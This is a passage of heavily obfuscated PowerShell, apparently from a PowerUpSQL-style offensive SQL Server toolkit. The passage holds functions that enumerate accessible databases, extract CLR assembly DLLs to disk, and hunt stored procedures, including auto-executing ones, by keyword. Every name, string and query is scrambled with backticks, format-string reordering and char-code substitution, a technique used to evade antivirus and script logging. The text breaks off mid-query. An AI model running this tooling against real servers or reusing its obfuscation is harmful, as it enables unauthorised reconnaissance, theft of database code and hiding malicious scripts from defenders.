            ${t`B`LDmLT`RiggeRST`emP} = &("{1}{3}{0}{2}"-f 'uer','Ge','y','t-SQLQ') -Instance ${iN`sTA`NCe} -Query ${Q`Uery} -Username ${U`sERn`Ame} -Password ${paS`SWO`RD} -Credential ${crE`dEN`T`ial} -SuppressVerbose

            
            ${TBLdm`lTrIG`GE`Rs} = ${t`Bl`D`MltriGge`RS} + ${tb`ldM`L`TrIgGE`RsT`EMP}
        }
    }

    End
    {
        
        ${TbLdml`Tr`I`G`gErs}
    }
}






Function  geT-SQLST`orEdPRoC`e`dur`ecLr
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MandatorY = ${F`ALSE},
        HelpmEssAGe = {"{2}{3}{8}{5}{14}{6}{12}{13}{7}{1}{10}{9}{0}{11}{4}" -f 'cate ','ccount to a','S','QL Se','th.','r','d','a','rve','henti','ut','wi','om','ain ',' or '})]
        [string]${use`R`NaME},

        [Parameter(manDaToRY = ${f`AL`Se},
        HElPMessAge = {"{9}{1}{8}{11}{3}{12}{0}{10}{7}{4}{6}{2}{5}"-f 'r','r','wi','omai',' aut','th.','henticate ','o','ve','SQL Se','d t','r or d','n account passwo'})]
        [string]${p`ASswORD},

        [Parameter(MAndAtOry = ${fa`lSE},
        hElPmeSSAge = {"{2}{4}{5}{3}{6}{1}{0}"-f'ls.','tia','Windows cr','e','e','d','n'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${crEDeN`T`IaL} =  (GET-vARiABle  ("045"+"9"+"m2") -vaLU )::"e`MPtY",

        [Parameter(maNDaTORy = ${fa`LsE},
                VALuEfRomPipeLInEBYprOPERTynAme = ${t`Rue},
        HElpmesSaGE = {"{3}{5}{1}{8}{6}{7}{0}{2}{4}" -f'ance','rve',' to connec','SQ','tion to.','L Se','s','t','r in'})]
        [string]${i`NSTAn`ce},

        [Parameter(maNDatory = ${F`A`lsE},
                valUEFROmpIpeLineByPrOpeRTYNaMe = ${t`Rue},
        heLpMEssagE = {"{3}{1}{0}{4}{5}{2}"-f 'ab','erver dat','e.','SQL S','ase',' nam'})]
        [string]${d`AtABasEn`A`Me},

        [Parameter(mandatORY = ${FA`LSE},
                ValuEFRomPIPELiNEByPROPERtyNAmE = ${tr`Ue},
        HELpmEsSaGe = {"{1}{3}{2}{4}{0}"-f's.','Fi','er','lt',' for filename'})]
        [string]${AssEm`BLy`NamE},

        [Parameter(maNDAtory = ${F`AlSe},
                vAlUEFROmpIpElinEbyPrOpeRTynAMe = ${tr`UE},
        heLpMESSage = {"{6}{1}{2}{0}{5}{7}{3}{4}"-f't','der to e','xpor','Ls to','.',' D','Fol','L'})]
        [string]${eX`p`OrT`FoLder},

        [Parameter(maNDatory = ${F`Al`sE},
                vAluEFroMPIPelIneBypRoPertynaMe = ${T`RUE},
        HelPmEsSAGE = {"{6}{1}{14}{5}{8}{9}{4}{11}{7}{2}{13}{3}{12}{15}{10}{0}" -f 'tabases.',' ','ciated','e','t','ot sh','Do','ase users asso','ow ','da','a','ab','fau',' with d','n','lt d'})]
        [Switch]${noDE`Fa`UlTS},

        [Parameter(ManDAtoRY = ${f`ALsE},
                vALuEFrOmpIpElinEbYpROPErtYNAmE = ${Tr`UE},
        heLPmesSAgE = {"{2}{3}{0}{4}{6}{5}{7}{1}" -f 'ow nativ','ell.','S','h','e C',' ','LR','as w'})]
        [Switch]${s`hOW`All},

        [Parameter(MandaTORy = ${faL`sE},
        HELPmESSage = {"{7}{4}{5}{3}{2}{6}{8}{0}{1}" -f'ct','ion is wrapped.','rors.  Used','se er',' ve','rbo',' when fu','Suppress','n'})]
        [switch]${sU`PPressv`ERb`ose}
    )

    Begin
    {
        
        ${t`BL`AsSEmblyF`iLES} = &("{3}{1}{2}{0}" -f't','w-','Objec','Ne') -TypeName ("{2}{0}{4}{1}{5}{3}"-f 'yste','a','S','ble','m.Dat','.DataTa')
        ${nu`Ll} = ${tBlAssE`MblY`F`Il`ES}."c`Ol`UMNs".("{1}{0}" -f'd','Ad').Invoke(("{3}{2}{0}{1}" -f 'am','e','mputerN','Co'))
        ${nU`Ll} = ${TblA`s`SEmblyF`ileS}."cO`lUmnS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f 'Inst','ance'))
        ${nu`ll} = ${tBlas`s`EmblY`FILEs}."C`OL`Umns".("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{1}{0}" -f 'seName','a','D','atab'))
        ${n`UlL} = ${tBlaSse`mb`LY`FIleS}."coLu`mNS".("{1}{0}" -f'd','Ad').Invoke(("{2}{3}{1}{0}"-f 'me','na','sche','ma_'))
        ${NU`Ll} = ${TBL`AS`sem`BLyFI`Les}."c`OLuMNs".("{1}{0}" -f'dd','A').Invoke(("{2}{1}{0}" -f 'id','le_','fi'))
        ${n`ULL} = ${tB`LAssEMBlYF`I`les}."c`olumNs".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}"-f 'fil','e_name'))
        ${NU`ll} = ${tBlaSs`E`M`BLyfilES}."CoLU`M`NS".("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}"-f'lr_','name','c'))   
        ${N`UlL} = ${T`Bla`s`SEMbLYfI`Les}."C`oLUMnS".("{1}{0}" -f'd','Ad').Invoke(("{3}{1}{2}{0}" -f 'id','m','bly_','asse'))
        ${n`Ull} = ${t`BLa`SSE`m`BlYFiLes}."c`oL`UMns".("{1}{0}"-f 'd','Ad').Invoke(("{0}{3}{2}{1}{4}"-f 'asse','y_na','bl','m','me')) 
        ${n`ULL} = ${t`Bl`AS`seMbLyFI`LEs}."ColUM`Ns".("{1}{0}" -f'dd','A').Invoke(("{4}{2}{3}{0}{1}"-f 'y_','class','sem','bl','as'))
        ${nU`Ll} = ${tBl`AS`sembL`YfiL`ES}."Co`l`UmNs".("{0}{1}" -f'Ad','d').Invoke(("{4}{0}{1}{2}{3}" -f 'sse','mb','ly_meth','od','a'))    
        ${N`ULl} = ${TBl`A`sSeMBlYf`iL`es}."C`o`lUmNS".("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}"-f'd','ject_i','sp_ob')) 
        ${N`ULl} = ${tBlaSse`mb`lYFIL`Es}."CO`lUm`NS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}"-f'ame','sp_','n'))
        ${n`Ull} = ${Tbla`SsE`mb`lyFILeS}."c`oLUm`NS".("{0}{1}"-f'A','dd').Invoke(("{0}{1}"-f'sp','_type'))
        ${NU`lL} = ${TB`lA`S`s`emblYFi`lEs}."cOl`UmNs".("{1}{0}"-f'd','Ad').Invoke(("{3}{5}{4}{0}{1}{2}"-f 'et','_','desc','p','ion_s','ermiss'))
        ${n`Ull} = ${tB`LaS`semB`L`YFILeS}."cO`lUmNS".("{1}{0}" -f'd','Ad').Invoke(("{3}{0}{1}{2}" -f 'ate_','d','ate','cre'))
        ${N`ULl} = ${tb`lA`SsEm`B`LY`FILeS}."c`Ol`UMNS".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}"-f '_date','modif','y'))
        ${n`Ull} = ${tB`L`ASSEMBLyfI`les}."c`OLuMNs".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}"-f't','con','ten'))
    }

    Process
    {
        

        
        ${cO`mP`UTERnAME} = &("{4}{3}{2}{1}{0}" -f'nce','nsta','erNameFromI','put','Get-Com') -Instance ${iN`S`TaNcE}

        
        if(-not ${i`NS`T`ANCe})
        {
            ${InS`TA`NCE} = ${eNV`:Co`mPuTEr`N`Ame}
        }

        
        ${test`cOn`Ne`ct`Ion} = &("{4}{5}{0}{3}{2}{1}"-f'LC','st','e','onnectionT','Get-','SQ') -Instance ${in`sTAN`cE} -Username ${uSER`Na`ME} -Password ${PAs`SW`ORD} -Credential ${cr`ED`eNt`IAL} -SuppressVerbose | &("{2}{1}{0}" -f're-Object','e','Wh') -FilterScript {
            ${_}."sT`ATuS" -eq ("{0}{1}{2}" -f'Acc','essibl','e')
        }

        if(${t`Es`TCONN`EctiON})
        {
            if( -not ${SU`PpreS`SvE`RBo`Se})
            {
                &("{0}{2}{1}"-f 'Write-Verb','e','os') -Message ("$Instance "+': '+'Connecti'+'on'+' '+'Succe'+'ss'+'.')
            }
        }
        else
        {
            if( -not ${s`Up`PRessVER`BosE})
            {
                &("{0}{3}{1}{2}" -f 'Wr','-Ve','rbose','ite') -Message ("$Instance "+': '+'Con'+'nect'+'ion '+'Failed'+'.')
            }
            return
        }

        
        if(${n`OD`EFaULTS})
        {
            ${t`Bld`ATabaseS} = &("{2}{3}{0}{1}" -f's','e','Get','-SQLDataba') -Instance ${I`Nst`AN`Ce} -Username ${UseR`NA`me} -Password ${pAs`s`WOrd} -Credential ${c`RedeNT`IaL} -HasAccess -DatabaseName ${dATabas`e`N`AmE} -SuppressVerbose  -NoDefaults
        }
        else
        {
            ${t`BLDaTA`BAsES} = &("{1}{0}{3}{2}" -f't','Get-SQLDa','ase','ab') -Instance ${i`NSta`N`Ce} -Username ${USeR`NA`mE} -Password ${pA`SsWo`Rd} -Credential ${Cr`Ed`Ent`IaL} -HasAccess -DatabaseName ${dA`TAbaseN`A`Me} -SuppressVerbose
        }

        
        if(${A`sS`EmB`lYN`AME}){
            ${A`Ss`embLYNAME`QU`eRy} = ('WH'+'ER'+'E '+'af.nam'+'e'+' '+'LI'+'KE '+"'%$AssemblyName%'")
        }else{
            ${as`Se`MbLy`N`AMEqUEry} = ""
        }

        
        ${C`OuN`TER} = 0

        
        ${TBLdaTAb`AS`eS} |
        &("{2}{0}{1}{3}" -f'ach-Obj','ec','ForE','t') -Process {
            
            ${DB`NA`Me} = ${_}."D`AtABAsena`me"

            if( -not ${suPpre`S`Sve`RbosE})
            {
                &("{1}{0}{2}"-f'rite-Verbos','W','e') -Message ("$Instance "+': '+'Se'+'a'+'rchin'+'g '+'f'+'or '+'C'+'LR '+'s'+'tored '+'proce'+'dures'+' '+'in'+' '+"$DbName")
            }

            
            ${q`UEry} = (' '+' '+'US'+'E '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELEC'+'T'+' '+' '+' '+' '+' '+' '+'SCHEM'+'A_'+'NAME(so'+'.[sche'+'m'+'a_id])'+' '+'A'+'S '+'[sch'+'ema_na'+'me'+']'+', '+'
'+'			 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'af.file_'+'id,'+'		'+'			 '+' '+'	
			'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'af.'+'name '+'+ '+(('4IK.dll'+'4IK'+' ') -cREpLAce([chAr]52+[chAr]73+[chAr]75),[chAr]39)+'as'+' '+'['+'file'+'_name],
	'+'		'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'smbly.clr_na'+'m'+'e,
			'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'as'+'mbly'+'.a'+'ssembl'+'y_i'+'d, '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
		'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'asmbl'+'y.'+'name'+' '+'AS'+' '+'[assemb'+'ly_nam'+'e]'+', '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'am.a'+'ss'+'embl'+'y_clas'+'s,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'m'+'.asse'+'mbly_me'+'thod,
			 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'o.obj'+'ect_id '+'a'+'s '+'[sp_ob'+'ject_'+'id],
'+'			 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'so.name'+' '+'A'+'S '+'[sp_na'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'so.'+'[type]'+' '+'a'+'s '+'['+'sp_typ'+'e],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'smb'+'ly'+'.permissi'+'on_set_'+'desc,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'asmbly'+'.crea'+'te_dat'+'e,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'smbly.'+'modi'+'fy_date'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'af.conten'+'t	'+'			'+'			'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+' '+' '+' '+' '+' '+' '+' '+'s'+'y'+'s.assem'+'bly_modu'+'les '+'a'+'m
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'I'+'NNER '+'JOI'+'N '+' '+'sy'+'s.a'+'ssemb'+'li'+'es '+'asmbly
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+' '+'as'+'mbly.assem'+'bly'+'_i'+'d '+'= '+'am'+'.'+'assembl'+'y'+'_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'INN'+'ER '+'JO'+'IN '+'s'+'y'+'s.as'+'sembly'+'_files '+'a'+'f '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'asm'+'b'+'ly.assembly'+'_id '+'= '+'af'+'.as'+'sembly_i'+'d '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'INNE'+'R '+'JOIN'+' '+' '+'s'+'ys.'+'objects '+'s'+'o
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+' '+'so'+'.['+'obje'+'ct'+'_id] '+'= '+'am.[o'+'bj'+'ect_id'+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$AssemblyNameQuery")

                    ${nati`V`Es`TUFf} = ((("{6}{24}{28}{26}{11}{8}{25}{14}{29}{20}{0}{1}{10}{22}{16}{37}{34}{12}{35}{21}{36}{31}{2}{3}{38}{7}{32}{27}{39}{30}{4}{9}{23}{13}{17}{33}{19}{15}{18}{5}" -f '                                   at.assembly_class,
   ','                               ',' asmbly.create_date,
               ','                     as','        INNER JOIN  sys.assemblies ',' BY    [assembly_name], [assembly_method], [sp_name]','
    ','odify_date,
                        ','file_i','asmbly 
       ','  NU','AME(at.[schema_id]) AS [SchemaName], 
			                        af.','           ','assembly_id = at.assembly_id
           ','name],
	','.assembly_id = af.assembly_id
    ','           ','             INNER JOIN sys.assembly_files af 
    ','                    ORDER','            ON asmbly','                                asmbly.name AS [AssemblyName],
 ','      quWUDTquW AS','LL AS [assembly_method],
			    ','                 ON asmbly.','                    UNION ALL
      ','d,					  	
			                        af.name + quW.dllquW as [file_','  SELECT      SCHEMA_N','           af.content								','                ','		                        asmbly.clr_name,
			                        asmbly.assembly_id,
    ','                  FROM        sys.assembly_types at
                ','             ',' ','        ','       at.name AS [sp_name],
            ','       ',' [type],
                                    asmbly.permission_set_desc,
                      ','         NULL as [sp_object_id],
			                 ','mbly.m','           
      '))."rEPl`ACe"(([CHAR]113+[CHAR]117+[CHAR]87),[StriNg][CHAR]39))

            
            if(${ShO`wa`Ll}){
                ${Qu`E`RY} = "$Query$NativeStuff"
            }

            
            ${TbLAsSE`mBLYF`ILE`StE`mp} = &("{2}{1}{0}"-f 'uery','Q','Get-SQL') -Instance ${iNS`T`ANcE} -Query ${qUE`Ry} -Username ${uS`e`RNamE} -Password ${pa`S`SwORD} -Credential ${C`Red`EnTI`Al} -SuppressVerbose

            
            ${TBLa`sS`emB`LyFi`LE`s`TemP} |
            &("{1}{0}{2}"-f 'orEach','F','-Object') -Process {

                
                ${Nu`lL} = ${T`BlaS`S`EM`BlyFILeS}."R`owS"."A`dd"(
                    [string]${cO`MP`UtERnaMe},
                    [string]${iNS`T`ANcE},
                    [string]${D`BNA`mE},
                    [string]${_}."sCHEma_`N`AME",
                    [string]${_}."f`IlE`_Id",
                    [string]${_}."fI`Le_N`AmE",
                    [string]${_}."clR_n`AmE",
                    [string]${_}."A`SsEm`BL`Y_id",
                    [string]${_}."As`sEmbLY_nA`Me",
                    [string]${_}."asS`EM`Bly_`CLaSs",
                    [string]${_}."assemb`LY_M`ET`Hod",
                    [string]${_}."sP`_ObjeC`T`_ID",
                    [string]${_}."S`P_nAMe",
                    [string]${_}."sp_`TYPE",
                    [string]${_}."PeR`mISsiOn_s`ET_d`ESc",
                    [string]${_}."cR`eA`TE_D`ATe",
                    [string]${_}."MoDIf`Y`_DA`Te",
                    [string]${_}."C`On`TEnT")

                
                ${CLrf`I`l`enAme} = ${_}."fiLE_N`A`Me"
                ${Cl`R`m`eThOD} = ${_}."AsSEM`Bly_M`E`TH`od"
                ${clr`AsSem`B`LY} = ${_}."aSSEm`BlY_N`AME"
                ${c`L`R`A`ss`embLYClaSs} = ${_}."A`sseMb`ly_c`LaSS"
                ${Cl`RSp} = ${_}."SP_`NaME"   
                
                
                &("{1}{2}{0}"-f 'e','Wri','te-Verbos') ("$instance "+': '+'- '+"File:$CLRFilename "+"Assembly:$CLRAssembly "+"Class:$CLRAssemblyClass "+"Method:$CLRMethod "+"Proc:$CLRSp")                             

                
                if(${E`x`p`ortfOlDeR}){

                    
                    ${ExpoRTOUt`PutfO`L`d`er} = "$ExportFolder\CLRExports"
                    If ((&("{2}{0}{1}" -f'p','ath','test-') ${ex`Po`RTOUtPUtfoL`dEr}) -eq ${F`A`LSE}){
                        &("{4}{1}{2}{3}{0}"-f'e','Ve','rb','os','Write-') ("$instance "+': '+' '+' '+'Cre'+'at'+'ing '+'ex'+'po'+'rt '+'fold'+'e'+'r: '+"$ExportOutputFolder")
                        ${N`UlL} = &("{0}{1}{2}"-f 'New','-It','em') -Path "$ExportOutputFolder" -type ("{0}{1}{2}" -f 'dir','e','ctory')
                    }  
                    
                    
                    ${ins`Ta`NcecLEan} = ${inS`TAN`ce} -replace('\\','_')
                    ${S`E`RVeRp`ATH} = "$ExportOutputFolder\$InstanceClean"
                    If ((&("{2}{1}{0}"-f'h','st-pat','te') ${SE`R`Ver`paTh}) -eq ${F`Al`se}){
                        &("{3}{2}{0}{4}{1}" -f 'e-V','se','rit','W','erbo') ("$instance "+': '+' '+' '+'Cre'+'at'+'in'+'g '+'se'+'rver '+'fol'+'der'+': '+"$ServerPath")
                        ${nU`Ll} = &("{1}{2}{0}" -f 'em','N','ew-It') -Path "$ServerPath" -type ("{0}{1}"-f'di','rectory')
                    }                   

                    
                    ${DATAB`AsEP`AtH} = "$ServerPath\$DbName"
                    If ((&("{2}{0}{1}"-f 'pa','th','test-') ${daTaBaSE`Pa`TH}) -eq ${fA`LSE}){
                        &("{1}{0}{2}{3}"-f'rite-Verb','W','os','e') ("$instance "+': '+' '+' '+'Cre'+'a'+'ting '+'dat'+'aba'+'s'+'e '+'folde'+'r: '+"$Databasepath")
                        ${n`ULl} = &("{1}{0}"-f 'tem','New-I') ${d`Ata`BAs`EpATh} -type ("{2}{1}{3}{0}"-f 'ry','c','dire','to')
                    } 
                    
                    
                    ${FULLE`XpOrT`Pa`TH} = "$Databasepath\$CLRFilename"
                    if(-not (&("{2}{1}{0}{3}" -f 'P','-','Test','ath') ${fUL`lEx`po`R`TpATH})){
                        &("{1}{2}{3}{0}" -f 'e','Write','-','Verbos') ("$Instance "+': '+' '+' '+'Exp'+'orti'+'ng '+"$CLRFilename")                        
                        ${_}."conte`Nt" | &("{2}{0}{3}{1}" -f 'Co','nt','Set-','nte') -Encoding ("{0}{1}"-f'By','te') ${f`UlLEXport`pA`Th}
                    }else{
                        &("{1}{3}{2}{0}"-f'ose','Write-','b','Ver') ("$Instance "+': '+' '+' '+'E'+'xp'+'orting '+"$CLRFilename "+'- '+'Abo'+'rted,'+' '+'f'+'ile '+'ex'+'ist'+'s.')  
                    }

                    
                    ${C`ount`Er} = ${Cou`NTer} + 1                    
                }                     
            }
        }
    }

    End
    {
        
        ${C`LrCO`UNt} = ${tBL`ASsemB`L`YfIlES}."R`oWS"."COu`NT"
        if (${C`L`RcOunT} -gt 0){
            &("{3}{1}{0}{2}" -f '-Ve','te','rbose','Wri') ("$Instance "+': '+'- '+'F'+'ound '+"$CLRCount "+'CLR'+' '+'s'+'to'+'red '+'proc'+'edur'+'es')
        }else{
            &("{1}{3}{2}{0}"-f'rbose','Wr','e','ite-V') ("$Instance "+': '+'- '+'N'+'o '+'C'+'LR '+'st'+'o'+'red '+'procedur'+'e'+'s '+'f'+'ound'+'.')    
        }

        
        ${TBlAsS`EMbLyf`i`lEs}
    }
}






Function  GeT-SqLstO`RE`DP`R`o`cEdU`Re
{
    

    [CmdletBinding()]
    Param(
        [Parameter(manDatoRY = ${fa`LSE},
        HELPMesSaGE = {"{10}{2}{0}{3}{6}{9}{7}{4}{5}{1}{11}{12}{8}"-f 'ver or doma','au','QL Ser','in','t',' to ',' ','ccoun','ith.','a','S','thenticat','e w'})]
        [string]${Us`ErNA`me},

        [Parameter(MANDATorY = ${F`A`lSe},
        HElpMessagE = {"{11}{0}{7}{5}{2}{10}{9}{3}{8}{1}{6}{4}" -f'v','a','t pas','enti','h.','accoun','te wit','er or domain ','c',' to auth','sword','SQL Ser'})]
        [string]${P`AS`SWoRD},

        [Parameter(MANdaTorY = ${FA`L`SE},
        hELpMEsSAGe = {"{1}{3}{2}{4}{5}{0}" -f'ls.','Wind','cred','ows ','enti','a'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`Re`dentiaL} =   $0459M2::"eMP`Ty",

        [Parameter(mandaTory = ${fA`lsE},
                VAlueFrOmpIpelINeByPrOPerTYNaMe = ${tr`UE},
        helPMessagE = {"{0}{3}{8}{9}{7}{1}{4}{6}{5}{2}" -f'SQL Se','onnec','.','rver i','t','n to','io','e to c','nst','anc'})]
        [string]${i`N`sTAnCe},

        [Parameter(ManDAtORY = ${f`ALSE},
                valuEfrompIpeLineBypRopeRTyname = ${TR`UE},
        HeLpmeSsAgE = {"{4}{5}{1}{0}{3}{2}"-f'er ','rv','name.','database ','SQ','L Se'})]
        [string]${daT`AbAs`en`AmE},

        [Parameter(MANdATOrY = ${fa`lSe},
                ValuefROMpiPELiNEBYPRopeRtYnAme = ${Tr`Ue},
        HeLpmeSsAGE = {"{3}{2}{1}{0}{4}" -f'e n','dur','oce','Pr','ame.'})]
        [string]${PRo`ce`d`URe`NaMe},

        [Parameter(maNDaToRY = ${FA`lsE},
                ValUefromPIpelINeBYprOpeRTYnAMe = ${t`Rue},
        heLPMEsSaGE = {"{4}{2}{3}{10}{9}{6}{8}{11}{0}{1}{7}{5}" -f 'at i','nclude the ke','r fo','r pro','Filte','word.','e','y','s t','r','cedu','h'})]
        [string]${kEY`WoRd},

        [Parameter(MANdatoRy = ${FAL`sE},
        helpmESsage = {"{17}{7}{2}{4}{9}{8}{3}{5}{15}{11}{16}{14}{10}{18}{0}{12}{13}{1}{6}"-f' when SQ',' service star','ude p','u','r','res','ts.','incl','ed','oc','c','config','L Se','rver','o exe',' ','ured t','Only ','ute'})]
        [switch]${Au`T`oe`XEc},

        [Parameter(ManDatORy = ${fA`lSe},
        hElpmESSaGE = {(("{8}{5}{7}{10}{0}{11}{1}{2}{12}{4}{3}{9}{6}" -f 'lect','ables ','from',' d','t','n4','es.','RLt s','Do','atabas','e',' t',' defaul'))."R`E`pLaCE"('4RL',[sTriNg][cHAr]39)})]
        [switch]${N`odEFAUl`TS},

        [Parameter(mANDatoRy = ${fA`LsE},
        helPMEssaGe = {"{13}{15}{6}{3}{5}{9}{1}{2}{8}{12}{11}{14}{0}{7}{10}{4}"-f ' i','s. ',' ','s','.',' verbose err','pres','s ','Used ','or','wrapped','en f','wh','S','unction','up'})]
        [switch]${SUpPrESsver`Bo`Se}
    )

    Begin
    {
        
        ${t`BlpRo`Cs} = &("{2}{0}{1}"-f 'je','ct','New-Ob') -TypeName ("{3}{0}{1}{2}"-f'ystem.Data.','DataTab','le','S')

        
        if (${p`R`ocEduReNa`ME})
        {
            ${PRoCEDUrENa`mE`F`I`lT`Er} = (' '+'AND'+' '+'ROUT'+'I'+'NE'+'_NAME'+' '+'like'+' '+"'$ProcedureName'")
        }
        else
        {
            ${prOCed`Ur`eN`AmEf`IL`TEr} = ''
        }

        
        if (${KE`YWO`Rd})
        {
            ${kEYw`OrDF`IL`TeR} = (' '+'A'+'ND '+'ROU'+'T'+'INE_DEF'+'INITIO'+'N'+' '+'like'+' '+"'%$Keyword%'")
        }
        else
        {
            ${kEyw`oR`dFi`lter} = ''
        }

        
        if (${AUTO`e`xeC})
        {
            ${autOex`eCF`Il`TER} = ("{1}{2}{0}{3}{4}{5}" -f't',' A','ND is_au','o_','execu','ted = 1')
        }
        else
        {
            ${a`UT`OExEc`F`ILteR} = ''
        }
    }

    Process
    {
        
        If (${IN`StanCe})
        {
            ${C`ompUt`eRna`Me} = ${I`NST`AnCE}.("{0}{1}" -f'spli','t').Invoke('\')[0].("{0}{1}" -f 'sp','lit').Invoke(',')[0]
            ${ins`TAnCE} = ${Inst`AN`ce}
        }
        else
        {
            ${c`Om`pU`TeR`NAME} = ${eNv:C`OmPU`TE`RNAme}
            ${inST`ANCE} = '.\'
        }

        
        ${tESTco`N`N`ectI`on} = &("{1}{0}{4}{2}{3}"-f'QLCo','Get-S','ect','ionTest','nn') -Instance ${iN`sta`Nce} -Username ${Us`erNA`me} -Password ${p`ASswoRd} -Credential ${Cr`edEnTI`Al} -SuppressVerbose | &("{2}{1}{0}"-f 't','-Objec','Where') -FilterScript {
            ${_}."S`TA`TUS" -eq ("{1}{2}{3}{0}" -f 'sible','A','cce','s')
        }
        if(${t`estcoN`N`ECtI`oN})
        {
            if( -not ${S`UP`p`RE`sSvErbOsE})
            {
                &("{2}{3}{0}{4}{1}" -f 'te-','erbose','W','ri','V') -Message ("$Instance "+': '+'C'+'onne'+'ction '+'Suc'+'c'+'ess.')
                &("{1}{0}{2}"-f'te-V','Wri','erbose') -Message ("$Instance "+': '+'G'+'rabb'+'ing '+'store'+'d'+' '+'pr'+'oced'+'u'+'res '+'fr'+'om '+'da'+'tab'+'ases '+'b'+'elow:')
            }
        }
        else
        {
            if( -not ${s`U`pPrESsVe`R`BOse})
            {
                &("{2}{3}{1}{0}"-f'se','rbo','W','rite-Ve') -Message ("$Instance "+': '+'Connec'+'ti'+'on '+'Faile'+'d'+'.')
            }
            return
        }

        
        if(${NOD`EFa`ULTs})
        {
            
            ${t`B`LdA`TaB`ASEs} = &("{2}{0}{3}{1}" -f'S','LDatabase','Get-','Q') -Instance ${I`Ns`TaNcE} -Username ${U`SeRna`ME} -Password ${pas`SW`oRD} -Credential ${cReDEN`T`IAl} -DatabaseName ${DaTAB`AsE`NAme} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${tbl`DATA`BA`SES} = &("{0}{2}{4}{1}{3}"-f'Get-SQ','a','LDat','se','ab') -Instance ${i`NS`TANCE} -Username ${usErn`A`mE} -Password ${pa`ssw`ORD} -Credential ${cr`e`DENTI`Al} -DatabaseName ${DataBaS`e`NA`Me} -HasAccess -SuppressVerbose
        }

        
        ${tbLd`AT`ABAses} |
        &("{3}{1}{2}{0}" -f'ject','ac','h-Ob','ForE') -Process {
            
            ${DBN`AME} = ${_}."dA`TABas`EN`AME"

            if( -not ${suP`P`RESsV`ErBo`se})
            {
                &("{0}{1}{2}" -f 'Wri','te-V','erbose') -Message ("$Instance "+': '+'- '+"$DbName")
            }

            
            ${Qu`Ery} = (' '+' '+'use'+' '+"[$DbName];
